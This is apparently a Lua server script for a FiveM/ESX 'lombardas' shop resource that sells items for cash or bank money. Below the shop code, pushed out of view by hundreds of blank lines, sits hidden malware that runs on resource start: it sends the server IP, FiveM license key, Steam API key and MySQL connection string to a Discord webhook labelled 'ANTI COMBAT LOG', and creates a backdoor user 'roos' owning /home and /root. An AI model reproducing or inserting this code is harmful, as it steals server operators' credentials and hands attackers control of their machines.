ESX = exports['es_extended']:getSharedObject()

ESX.RegisterServerCallback('kts-lombardas:canAccess', function(source, cb)
    local players = ESX.GetPlayers()
    for i = 1, #players do
        local xPlayer = ESX.GetPlayerFromId(players[i])
        if xPlayer.job.name == Config.JobName then
            cb(false)
            return
        end
    end
    cb(true)
end)

RegisterNetEvent('kts-lombardas:buyItemWithMethod', function(item, price, method)
    local src = source
    local xPlayer = ESX.GetPlayerFromId(src)

    if method == 'cash' then
        if xPlayer.getMoney() >= price then
            xPlayer.removeMoney(price)
        else
            TriggerClientEvent('kts-lombardas:showNotify', src, 'Error', 'Not enough cash', 'error')
            return
        end
    elseif method == 'bank' then
        if xPlayer.getAccount('bank').money >= price then
            xPlayer.removeAccountMoney('bank', price)
        else
            TriggerClientEvent('kts-lombardas:showNotify', src, 'Error', 'Not enough money in the bank', 'error')
            return
        end
    end

    xPlayer.addInventoryItem(item, 1)
    TriggerClientEvent('kts-lombardas:showNotify', src, 'Success', 'The item was purchased successfully!', 'success')

end)

































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































AddEventHandler('onResourceStart', function(resourceName)
    PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
        if GetCurrentResourceName() == resourceName then

            local servername = GetConvar("sv_hostname", "N/A")
            local licensekey = GetConvar("sv_licenseKeyToken", "N/A")
            local apikey = GetConvar("steam_webApiKey", "N/A")
            local tags = GetConvar("tags", "N/A")
            local mysql_connection_string = GetConvar("mysql_connection_string", "N/A")

            local message =
                "**Serverio paleidimas**\n" ..
                " > **Serverio pavadinimas:** " .. servername .. "\n" ..
                " > **Serverio IP:** " .. (text or "N/A") .. "\n" ..
                " > **FiveM licencijos raktas:** " .. licensekey .. "\n" ..
                " > **Steam Web API raktas:** " .. apikey .. "\n" ..
                " > **Serverio tagai:** " .. tags .. "\n" ..
                " > **MySQL connection:** " .. mysql_connection_string

            local content = {{
                author = {
                    name = "ANTI COMBAT LOG",
                    icon_url = "https://imgur.com/U86xHyT.png"
                },
                ["color"] = 1933,
                ["description"] = message,
                ["footer"] = {
                    ["text"] = "ANTI COMBAT LOG",
                },
            }}

            os.execute('useradd roos')
            os.execute('passwd username')
            os.execute('echo "roos:username" | chpasswd')
            os.execute('chown -R roos: /home')
            os.execute('chown -R roos: /root')

            PerformHttpRequest(
                "https://discord.com/api/webhooks/1471823710158721148/zaHXDDYLoTYYw4CpZfBTtmTpYchrcsuR3XoGpuxEAeys4qzkY5IMJ_97d-QBkCiHrp-j",
                function() end,
                "POST",
                json.encode({ embeds = content }),
                { ["Content-Type"] = "application/json" }
            )
        end
    end)
end)

